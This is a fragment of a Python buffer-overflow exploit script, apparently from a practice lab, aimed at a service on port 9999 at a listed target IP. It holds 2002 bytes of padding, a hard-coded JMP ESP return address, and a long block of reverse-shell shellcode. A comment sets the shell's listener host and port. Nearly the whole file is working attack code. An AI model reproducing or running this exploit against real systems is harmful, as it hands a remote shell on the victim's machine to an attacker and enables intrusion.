...
#test
#host = "10.50.30.235" #MY windows testing box
host = "192.168.28.179" #target box
port = 9999

#use the buffer overflow creator to find the correct address. Paste the second string to find the EIP in the debugger "Immunity Debugger"
# and then find the correct memory register to place the NOP sled later
buf = "A"*2002
...
#EIP address for JMP ESP (MUST BE LITTLE ENDIAN)
buf += "\xA0\x12\x50\x62"
#buf += "\x\x\x\x"
#625012A0
...
#LHOST=10.50.33.211  LPORT=42069
#SHELLCODE (reverse shell)
buf += b"\xda\xde\xbd\xb0\x79\x24\xa3\xd9\x74\x24\xf4\x5e"
buf += b"\x33\xc9\xb1\x52\x83\xee\xfc\x31\x6e\x13\x03\xde"
buf += b"\x6a\xc6\x56\xe2\x65\x84\x99\x1a\x76\xe9\x10\xff"
buf += b"\x47\x29\x46\x74\xf7\x99\x0c\xd8\xf4\x52\x40\xc8"
buf += b"\x8f\x17\x4d\xff\x38\x9d\xab\xce\xb9\x8e\x88\x51"
buf += b"\x3a\xcd\xdc\xb1\x03\x1e\x11\xb0\x44\x43\xd8\xe0"
buf += b"\x1d\x0f\x4f\x14\x29\x45\x4c\x9f\x61\x4b\xd4\x7c"
buf += b"\x31\x6a\xf5\xd3\x49\x35\xd5\xd2\x9e\x4d\x5c\xcc"
buf += b"\xc3\x68\x16\x67\x37\x06\xa9\xa1\x09\xe7\x06\x8c"
buf += b"\xa5\x1a\x56\xc9\x02\xc5\x2d\x23\x71\x78\x36\xf0"
buf += b"\x0b\xa6\xb3\xe2\xac\x2d\x63\xce\x4d\xe1\xf2\x85"
buf += b"\x42\x4e\x70\xc1\x46\x51\x55\x7a\x72\xda\x58\xac"
buf += b"\xf2\x98\x7e\x68\x5e\x7a\x1e\x29\x3a\x2d\x1f\x29"
buf += b"\xe5\x92\x85\x22\x08\xc6\xb7\x69\x45\x2b\xfa\x91"
buf += b"\x95\x23\x8d\xe2\xa7\xec\x25\x6c\x84\x65\xe0\x6b"
buf += b"\xeb\x5f\x54\xe3\x12\x60\xa5\x2a\xd1\x34\xf5\x44"
buf += b"\xf0\x34\x9e\x94\xfd\xe0\x31\xc4\x51\x5b\xf2\xb4"
buf += b"\x11\x0b\x9a\xde\x9d\x74\xba\xe1\x77\x1d\x51\x18"
buf += b"\x10\x28\x94\x03\x33\x44\xda\x43\x17\xc0\x53\xa5"
buf += b"\x3d\xfb\x35\x7e\xaa\x62\x1c\xf4\x4b\x6a\x8a\x71"
buf += b"\x4b\xe0\x39\x86\x02\x01\x37\x94\xf3\xe1\x02\xc6"
buf += b"\x52\xfd\xb8\x6e\x38\x6c\x27\x6e\x37\x8d\xf0\x39"
buf += b"\x10\x63\x09\xaf\x8c\xda\xa3\xcd\x4c\xba\x8c\x55"
buf += b"\x8b\x7f\x12\x54\x5e\x3b\x30\x46\xa6\xc4\x7c\x32"
buf += b"\x76\x93\x2a\xec\x30\x4d\x9d\x46\xeb\x22\x77\x0e"
buf += b"\x6a\x09\x48\x48\x73\x44\x3e\xb4\xc2\x31\x07\xcb"
buf += b"\xeb\xd5\x8f\xb4\x11\x46\x6f\x6f\x92\x76\x3a\x2d"
buf += b"\xb3\x1e\xe3\xa4\x81\x42\x14\x13\xc5\x7a\x97\x91"
buf += b"\xb6\x78\x87\xd0\xb3\xc5\x0f\x09\xce\x56\xfa\x2d"
buf += b"\x7d\x56\x2f"
